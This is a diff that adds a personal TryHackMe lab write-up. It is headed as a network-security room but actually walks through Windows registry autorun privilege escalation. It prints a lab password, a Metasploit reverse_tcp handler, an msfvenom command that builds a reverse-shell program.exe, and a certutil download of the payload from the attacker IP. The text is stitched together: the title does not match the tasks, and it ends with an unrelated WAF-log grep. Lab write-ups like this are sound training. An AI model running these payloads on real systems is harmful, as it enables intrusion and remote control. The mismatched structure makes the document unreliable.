@@ -1,0 +1,201 @@
+<h1 align="center">Network Security Essentials</h1>
+<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/fdddadf5-8341-4055-90e8-810fa78316f5"><br>
+2025, September 25<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
+and I’m excited to join you on this adventure, part of my <code>510</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
+<em>Learn about key aspects of network security essentials and how to monitor and protect against adversaries</em>.<br>
+Access it <a href="https://tryhackme.com/room/networksecurityessentials">here</a>.<br>
+<img width="1200px" src="https://github.com/user-attachments/assets/6eb54ea1-8481-4b05-99e2-a7d7453f78b3"></p>
+
+<h2 align="center">Task 1 . Connecting to TryHackMe network</h2>
+<br>
+
+<p><em>Answer the question below</em></p>
+
+<p>1.1.Connect to TryHackMe´s VPN..<br>
+<code>No answer needed</code></p>
+
+<h2 align="center">Task 2 . Deploy the vulnerable machine</h2>
+<p>This room will teach you a variety of Windows privilege escalation tactics, including kernel exploits, DLL hijacking, service exploits, registry exploits, and more. This lab was built utilizing Sagi Shahar's privesc workshop (https://github.com/sagishahar/lpeworkshop) and utilized as part of The Cyber Mentor's Windows Privilege Escalation Udemy course (http://udemy.com/course/windows-privilege-escalation-for-beginners).<br>
+
+<br>All tools needed to complete this course are on the <strong>user</strong> desktop (C:\Users\user\Desktop\Tools).<br>
+
+Let's first connect to the machine.  RDP is open on port 3389.  Your credentials are:<br>
+
+username: user<br>
+password: ***********<br>
+
+For any administrative actions you might take, your credentials are:<br>
+
+username: TCM<br>
+password: *********</p>
+<br>
+
+<p><em>Answer the questions below</em></p>
+
+<p>2.1. Deploy the machine and log into the user account via RDP.<br>
+<code>No answer needed</code></p>
+
+
+```bash
+apt install rdesktop
+```
+
+
+```bash
+rdesktop -u user -p "password321" 10.201.56.185 -g 90%
+```
+
+rdesktop -u user -p "password321" 10.201.56.185 -g 90%
+
+<br>
+<br>
+
+<p>2.2. Open a command prompt and run 'net user'. Who is the other non-default user on the machine?<br>
+<code>tcp</code></p>
+
+<img width="519" height="181" alt="image" src="https://github.com/user-attachments/assets/d27f5c34-b481-45cb-948b-dfd805d62014" />
+
+
+<br>
+<br>
+<h2 align="center">Task 3 . Registry Escalation - Autorun</h2>
+<h3 align="center">Detection</h3>
+<p>Windows VM<br>
+
+1. Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe<br>
+2. In Autoruns, click on the ‘Logon’ tab.<br>
+3. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.<br>
+4. In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"<br>
+5. From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.</p>
+
+<h3 align="center">Exploitation</h3>
+
+<p>Kali VM<br>
+
+1. Open command prompt and type: msfconsole<br>
+2. In Metasploit (msf > prompt) type: use multi/handler<br>
+3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp<br>
+4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]<br>
+5. In Metasploit (msf > prompt) type: run<br>
+6. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe<br>
+7. Copy the generated file, program.exe, to the Windows VM.<br><br>
+
+Windows VM<br>
+
+1. Place program.exe in ‘C:\Program Files\Autorun Program’.<br>
+2. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.<br><br>
+
+Kali VM<br>
+
+1. Wait for a new session to open in Metasploit.<br>
+2. In Metasploit (msf > prompt) type: sessions -i [Session ID]<br>
+3. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid</p>
+
+<p><em>Answer the questions below</em></p>
+
+<p>3.1. Click 'Completed' once you have successfully elevated the machine<br>
+<code>No answer needed</code></p>
+
+<p aling="center">Detection</p>
+
+```bash
+C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
+```
+
+<img width="499" height="286" alt="image" src="https://github.com/user-attachments/assets/6e8cb805-b40b-4372-8130-90bcde71ce85" />
+
+<br>
+<br>
+
+<img width="569" height="226" alt="image" src="https://github.com/user-attachments/assets/c6034772-6f6e-4f68-a2ee-381de30b7a73" />
+
+<br>
+<br>
+
+<img width="569" height="243" alt="image" src="https://github.com/user-attachments/assets/bf90288e-9847-49ca-a447-088f024cb321" />
+
+<br>
+<br>
+
+```bash
+C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
+```
+
+<img width="582" height="237" alt="image" src="https://github.com/user-attachments/assets/276b4e33-1152-41ea-a83d-8fcb9b516398" />
+
+<br>
+<br>
+
+<p aling="center">Exploitation</p>
+
+```bash
+:~/WindowsPrivEscArena# mfsconsole
+...
+msf6>
+```
+
+```bash
+msf6> use multi/handler
+msf6 exploit(multi/handler) >
+```
+
+```bash
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+```
+
+```bash
+msf6 exploit(multi/handler) > set LHOST 10.201.113.77
+LHOST => 10.201.113.77
+```
+
+```bash
+msf6 exploit(multi/handler) > set LPORT 9001
+LPORT => 9001
+```
+
+```bash
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.201.113.77:9001
+```
+
+```bash
+:~/WindowsPrivEscArena# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.201.113.77 LPORT=9001 -f exe -o program.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+Saved as: program.exe
+```
+
+
+<img width="580" height="85" alt="image" src="https://github.com/user-attachments/assets/9f059262-6490-4048-aa6d-4fb1239b3638" />
+
+
+```bash
+PS C:\Users\user> certutil.exe -urlcache -f http://10.201.113.77:8000/program.exe
+****  Online  ****
+CertUtil: -URLCache command FAILED: 0x80072efd (WIN32: 12029)
+CertUtil: A connection with the server could not be established
+```
+
+
+```bash
+:~/WindowsPrivEscArena# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.201.113.77 LPORT=9001 -f exe -o program.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+Saved as: program.exe
+```
+
+
+
+
+
+
+```bash
+ubuntu@tryhackme:~/Desktop/Perimeter_logs/task6$ grep -E 'BLOCK' waf_logs.txt
+```
